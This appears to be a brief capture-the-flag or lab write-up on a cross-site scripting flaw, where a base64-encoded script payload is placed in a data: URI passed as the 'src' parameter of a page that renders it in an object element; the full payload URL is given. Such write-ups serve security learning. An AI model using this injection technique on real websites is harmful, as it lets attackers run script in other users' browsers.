# XSS Data attribute

The page renders the content inside `object` element with the `data` attribute.
This element is powerful enough to render a custom HTML content, both via URL and a local "blob" (structure `data:[mimeType],[content]`).

So to inject a 

```js
<script>alert(1)</script>
```

we need to convert it to base64 (`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`), and the final `src` param becomes: `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

# Payload

http://<ip>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
